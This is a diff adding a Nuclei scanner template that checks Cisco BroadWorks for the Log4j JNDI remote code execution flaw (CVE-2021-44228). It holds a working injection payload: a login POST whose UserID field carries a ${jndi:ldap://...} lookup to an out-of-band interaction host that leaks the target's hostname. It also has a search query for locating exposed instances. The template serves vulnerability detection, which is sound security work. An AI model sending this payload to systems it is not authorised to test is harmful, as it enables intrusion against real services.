@@ -1,0 +1,64 @@
+id: cisco-broadworks-log4j-rce
+
+info:
+  name: Cisco BroadWorks - Remote Code Execution (Apache Log4j)
+  author: shaikhyaser
+  severity: critical
+  description: |
+    Cisco BroadWorks is susceptible to Log4j JNDI remote code execution. Cisco BroadWorks is an enterprise-grade calling and collaboration platform delivering unmatched performance, security and scale.
+  reference:
+    - https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-apache-log4j-qRuKNEbd
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-77,CWE-502
+  metadata:
+    max-request: 1
+    fofa-query: "Cisco BroadWorks"
+  tags: cve,cve2021,rce,jndi,log4j,cisco,oast,kev,vuln
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
+  str: "{{rand_base(5)}}"
+
+http:
+  - raw:
+      - |
+        POST /commpilot/servlet/Login HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{RootURL}}
+        Referer: {{RootURL}}
+        Content-Type: application/x-www-form-urlencoded
+
+        domain={{str}}.com&UserID=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&EnteredUserID=a&Password=a
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip # Print remote interaction IP in output
+
+      - type: regex
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print injection point in output
+        part: interactsh_request
+
+      - type: regex
+        group: 1
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
+        part: interactsh_request
+# digest: 4b0a004830460221009e8ab12778c0578a9a056cc71ea3d8ddf3f37fd6ff93b7f5e32d37be25286d6f022100f67686bda13326beeaf52cac5b35b66e7269e34bf1266256c26f50e4fe8356c1:922c64590222798bb761d5b6d8e72950
